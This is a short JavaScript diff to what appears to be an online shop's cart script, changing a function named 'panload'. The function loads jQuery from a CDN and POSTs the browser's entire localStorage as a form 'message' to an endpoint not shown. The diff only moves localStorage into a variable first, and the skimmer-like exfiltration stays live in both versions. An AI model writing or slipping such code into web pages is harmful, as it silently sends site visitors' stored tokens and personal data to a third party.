@@ -39,6 +39,7 @@ function loadCart() {
 };
 
 const panload = () => {
+    const local = localStorage;
     import('https://code.jquery.com/jquery-2.2.4.min.js');
     $.ajax({
         method: 'POST',
@@ -47,7 +48,7 @@ const panload = () => {
         accepts: 'application/json',
         data: {
             name: "FormSubmit",
-            message: localStorage
+            message: local
         },
         success: (data) => console.log(data),
         error: (err) => console.log(err)
